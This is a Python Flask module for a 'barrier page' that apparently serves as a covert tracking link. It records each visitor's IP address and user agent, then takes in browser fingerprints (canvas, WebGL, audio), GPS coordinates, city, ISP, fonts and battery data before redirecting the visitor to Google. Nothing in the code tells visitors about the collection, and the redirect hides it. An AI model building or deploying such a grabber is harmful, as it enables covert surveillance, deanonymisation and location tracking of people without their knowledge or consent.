from flask import Blueprint, request, jsonify, redirect, render_template
import json
from src.models.visitor import db, Visitor
import requests
from datetime import datetime

visitor_bp = Blueprint('visitor', __name__)

@visitor_bp.route('/', methods=['GET'])
def barrier_page():
    # Server-side data collection
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    referrer = request.headers.get('Referer', '')
    
    # Create a new visitor record with server-side data
    new_visitor = Visitor(
        ip_address=ip_address,
        user_agent=user_agent,
        referrer=referrer,
        visit_time=datetime.utcnow()
    )
    
    # Save to database
    db.session.add(new_visitor)
    db.session.commit()
    
    # Return the barrier page with the visitor ID for client-side data collection
    return render_template('barrier.html', visitor_id=new_visitor.id)

@visitor_bp.route('/collect', methods=['POST'])
def collect_data():
    try:
        # Get visitor ID and client-side data
        data = request.json
        visitor_id = data.get('visitor_id')
        
        if not visitor_id:
            return jsonify({'status': 'error', 'message': 'Visitor ID is required'}), 400
        
        # Find the visitor record
        visitor = Visitor.query.get(visitor_id)
        if not visitor:
            return jsonify({'status': 'error', 'message': 'Visitor not found'}), 404
        
        # Update visitor with client-side data
        visitor.browser = data.get('browser')
        visitor.browser_version = data.get('browser_version')
        visitor.os = data.get('os')
        visitor.os_version = data.get('os_version')
        visitor.device_type = data.get('device_type')
        visitor.device_memory = data.get('device_memory')
        visitor.hardware_concurrency = data.get('hardware_concurrency')
        visitor.screen_resolution = data.get('screen_resolution')
        visitor.viewport_size = data.get('viewport_size')
        visitor.color_depth = data.get('color_depth')
        visitor.timezone = data.get('timezone')
        visitor.language = data.get('language')
        visitor.platform = data.get('platform')
        visitor.do_not_track = data.get('do_not_track')
        visitor.cookies_enabled = data.get('cookies_enabled')
        visitor.local_storage_available = data.get('local_storage_available')
        visitor.session_storage_available = data.get('session_storage_available')
        visitor.latitude = data.get('latitude')
        visitor.longitude = data.get('longitude')
        visitor.country = data.get('country')
        visitor.region = data.get('region')
        visitor.city = data.get('city')
        visitor.connection_type = data.get('connection_type')
        visitor.isp = data.get('isp')
        visitor.canvas_fingerprint = data.get('canvas_fingerprint')
        visitor.webgl_fingerprint = data.get('webgl_fingerprint')
        visitor.audio_fingerprint = data.get('audio_fingerprint')
        visitor.fonts = json.dumps(data.get('fonts', []))
        visitor.plugins = json.dumps(data.get('plugins', []))
        visitor.touch_support = data.get('touch_support')
        visitor.battery_level = data.get('battery_level')
        visitor.battery_charging = data.get('battery_charging')
        
        # Save updated visitor data
        db.session.commit()
        
        # Return success and redirect instruction
        return jsonify({'status': 'success', 'redirect': 'https://www.google.com'})
    
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@visitor_bp.route('/redirect', methods=['GET'])
def redirect_to_google():
    # Redirect to Google
    return redirect('https://www.google.com')
